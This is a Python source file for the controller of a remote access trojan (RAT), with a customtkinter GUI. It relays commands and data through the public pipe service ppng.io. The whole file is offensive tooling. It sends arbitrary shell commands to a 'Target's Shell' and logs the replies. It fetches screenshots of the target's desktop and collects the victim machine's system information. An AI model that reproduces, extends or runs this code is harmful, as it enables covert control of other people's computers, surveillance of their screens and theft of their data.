import threading
import requests
from customtkinter import *
from PIL import Image

set_appearance_mode("black")
set_default_color_theme("theme.json")

root = CTk()
root.geometry("1600x900")

root.title("[RAT]")

link = "creep"
borders_width = 10
border_color = "#090909"
font = ("Consolas", 24)


def send(data):
    requests.post(
        f"https://ppng.io/{link}",
        data=str.encode(data) if type(data) != bytes else data,
    )


def receive(type=str):
    return (
        requests.get(f"https://ppng.io/{link}").text
        if type == str
        else requests.get(f"https://ppng.io/{link}").content
    )


def manage_shell(command, shell_panel, entry, hostname):
    if entry.get():

        entry.delete(0, END)
        send(command)
        response = receive()

        with open("shell_log.txt", "a", encoding="latin-1") as f:
            f.write(f"[LOG] : [{command}] -> [{response}]")

        command_label = CTkLabel(
            master=shell_panel,
            text=f"[You] : {command}",
            anchor="w",
            font=("Consolas", 16),
        )
        command_label.pack(side=TOP, fill="x", padx=3, pady=3)

        response_label = CTkLabel(
            master=shell_panel,
            text=f"[{hostname.split(' : ')[1]}] : {response}",
            anchor="w",
            font=("Consolas", 16),
        )
        response_label.pack(side=TOP, fill="x", padx=3, pady=3)


def manage_desktop_image(desktop_image, x, y):
    for child in desktop_image.winfo_children():
        child.destroy()

    send("<send_desktop>")
    desktop = receive(bytes)
    with open("desktop.png", "wb") as f:
        f.write(desktop)

    image = CTkImage(Image.open("desktop.png"), size=(x, y))
    image_button = CTkButton(
        master=desktop_image,
        image=image,
        text="Target's Screen (click to reload)",
        font=font,
        compound="top",
        fg_color="#000000",
        hover_color="#111111",
        command=lambda: manage_desktop_image(desktop_image, x, y),
        border_color=border_color,
        border_width=borders_width,
        corner_radius=0
    )
    image_button.pack(fill=BOTH, expand=True)


def control_panel(desktop_information):
    hostname = desktop_information.split("\n")[-1]
    root.title(f"[RAT] @ {hostname}")

    root.columnconfigure(index=0, weight=1)
    root.columnconfigure(index=1, weight=5)
    root.rowconfigure(index=0, weight=1)
    root.rowconfigure(index=1, weight=1)

    shell_panel = CTkFrame(
        master=root,
        border_color="#000000",
        border_width=borders_width,
        fg_color="#000000",
    )
    shell_panel.grid(row=0, column=1, rowspan=2, sticky="nsew", padx=20, pady=20)

    desktop_image = CTkFrame(
        master=root, border_color=border_color, border_width=borders_width, bg_color=border_color, fg_color=border_color
    )
    desktop_image.grid(row=0, column=0, sticky="nsew", padx=20, pady=20)

    desktop_info = CTkScrollableFrame(
        master=root,
        height=10,
        border_color=border_color,
        border_width=borders_width,
        fg_color="#000000",
    )
    desktop_info.grid(row=1, column=0, sticky="nsew", padx=20, pady=20)

    largest_size = (
        max(len(thing.split(" : ")[0]) for thing in desktop_information.split("\n")) + 3
    )

    for line in desktop_information.split("\n"):
        key, value = line.split(" : ")
        formatted_line = f"{key.ljust(largest_size)} : {value}"
        label = CTkLabel(
            master=desktop_info, font=font, text=formatted_line, anchor="w"
        )
        label.pack(fill=BOTH, padx=3, pady=3)

    x = int(desktop_image.winfo_geometry().split("x")[0]) + 500
    y = int(9 / 16 * x)
    image = CTkImage(Image.open("desktop.png"), size=(x, y))
    image_button = CTkButton(
        master=desktop_image,
        image=image,
        text="Target's Screen (click to reload)",
        font=font,
        compound="top",
        fg_color="#000000",
        hover_color="#111111",
        command=lambda: manage_desktop_image(desktop_image, x, y),
        border_color=border_color,
        border_width=borders_width,
        corner_radius=0,
    )
    image_button.pack(fill=BOTH, expand=True)

    entry = CTkEntry(master=shell_panel, font=font, fg_color="#111111")
    entry.pack(side="bottom", fill=X, padx=5, pady=5)
    mainframe_LOL = CTkScrollableFrame(
        master=shell_panel,
        fg_color="#000000",
        label_text="Target's Shell : ",
        label_font=font,
        label_fg_color="#111111"
    )
    mainframe_LOL.pack(side="top", expand=True, fill=BOTH)
    entry.bind(
        "<Return>",
        lambda event: manage_shell(entry.get(), mainframe_LOL, entry, hostname),
    )


def main():
    frame = CTkFrame(master=root, border_color="#111111", border_width=borders_width)
    frame.pack(padx=100, pady=100, fill=BOTH, expand=True)
    textbox = CTkLabel(master=frame, font=font, text="Waiting for connections...")
    textbox.pack(fill=BOTH, expand=True)

    send("<send_desktop>")
    desktop = receive(bytes)
    with open("desktop.png", "wb") as f:
        f.write(desktop)

    send("<computer_information>")
    desktop_information = receive()
    with open("desktop_information.txt", "a") as f:

        largest_size = (
        max(len(thing.split(" : ")[0]) for thing in desktop_information.split("\n")) + 3
        )
        for line in desktop_information.split("\n"):
            key, value = line.split(" : ")
            formatted_line = f"{key.ljust(largest_size)} : {value}\n"
            f.write(formatted_line)
            
    for widget in root.winfo_children():
        widget.destroy()

    control_panel(desktop_information)

threading.Thread(target=main).start()
root.mainloop()
